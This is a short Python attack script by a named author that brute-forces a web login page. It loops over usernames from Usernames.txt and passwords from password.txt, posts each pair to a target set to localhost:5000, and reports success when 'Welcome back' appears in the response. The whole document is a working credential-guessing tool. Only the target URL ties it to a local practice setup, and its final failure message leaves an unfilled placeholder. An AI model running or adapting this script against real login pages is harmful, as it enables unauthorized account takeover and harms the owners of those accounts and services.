#!/usr/bin/env python3
'''
Date : 1401/12/22
Author : AmirhosseinKhanshabani - @AmirZoyber
Description: With script you can brute force a login page with a passList.
             It works with the failure or sucess message in DOM we see.

'''
import requests
import sys
from time import sleep
target = "http://127.0.0.1:5000"

#defaultUsernames = ["admin","user","test"]
userNameFile = open("Usernames.txt",'r')
passwordFile = "password.txt"

needle = "Welcome back"   # if this string is in the response, we have a successfull login.

for username in userNameFile:
    with open(passwordFile,'r') as passwordList:
        #password = passwordList.readline()
        for password in passwordList:
            sys.stdout.write("[\] Trying: %s:%s\r" % (username.strip(),password.strip()))
            sys.stdout.flush()
            r = requests.post(target, data = {'username':username.strip(),'password':password.strip()})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[+] Success: %s:%s"%(username.strip(),password.strip()))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\t[-] No password found for user: %s !")
        sys.stdout.write("\n")
